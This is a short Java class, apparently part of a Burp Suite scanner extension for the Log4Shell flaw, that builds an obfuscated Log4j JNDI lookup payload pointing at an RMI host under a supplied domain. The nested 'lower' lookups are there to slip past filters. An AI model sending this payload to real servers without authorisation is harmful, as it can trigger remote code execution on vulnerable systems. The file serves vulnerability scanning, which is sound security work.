package burp.poc.impl;

import burp.poc.IPOC;
import burp.utils.Utils;

public class POC5 implements IPOC {
    @Override
    public String generate(String domain) {
        return "${${lower:${lower:jndi}}:${lower:rmi}://" + domain + "/}";
    }

    @Override
    public int getType() {
        return POC_TYPE_RMI;
    }
}
